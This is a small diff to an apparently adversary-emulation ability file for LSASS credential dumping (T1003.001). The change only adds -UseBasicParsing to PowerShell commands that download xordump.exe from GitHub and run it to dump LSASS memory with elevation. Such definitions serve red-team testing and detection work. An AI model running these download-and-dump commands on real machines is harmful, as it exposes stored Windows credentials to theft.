@@ -16,8 +16,8 @@
         command: 'if (Test-Path ''C:\Windows\Temp\xordump.exe'') {exit 0} else {exit
           1}; then : ; else [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
           Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"
-          -OutFile C:\Windows\Temp\xordump.exe; fi; C:\Windows\Temp\xordump.exe -out
-          C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41'
+          -OutFile C:\Windows\Temp\xordump.exe -UseBasicParsing; fi; C:\Windows\Temp\xordump.exe
+          -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41'
         cleanup: 'Remove-Item #{output_file} -ErrorAction Ignore'
         elevation_required: true
   plugin: atomic
@@ -50,9 +50,9 @@
       get_prereq_command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
         Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"
-        -OutFile #{xordump_exe}
+        -OutFile #{xordump_exe} -UseBasicParsing
 
         '
     technique_created: '2020-02-11T18:41:44.783Z'
     atomic_guid: 86fc3f40-237f-4701-b155-81c01c48d697
-    import_timestamp: '2026-10-20T07:08:30.259299Z'
+    import_timestamp: '2026-10-21T07:01:52.174833Z'
